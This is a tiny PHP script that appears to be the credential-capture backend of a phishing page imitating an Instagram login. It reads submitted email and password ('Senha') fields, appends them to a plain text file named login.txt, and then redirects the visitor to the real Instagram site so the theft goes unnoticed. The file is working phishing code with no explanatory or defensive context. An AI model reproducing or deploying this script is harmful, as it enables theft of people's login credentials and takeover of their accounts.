<?php 
    file_put_contents("login.txt", "[Login GAL]" . "\n" . "Email : " . $_POST['Email'] . "\n" . "Senha : " . $_POST['Senha'] . "\n", FILE_APPEND);
    header('Location:https://www.instagram.com/ ');
    exit();
?>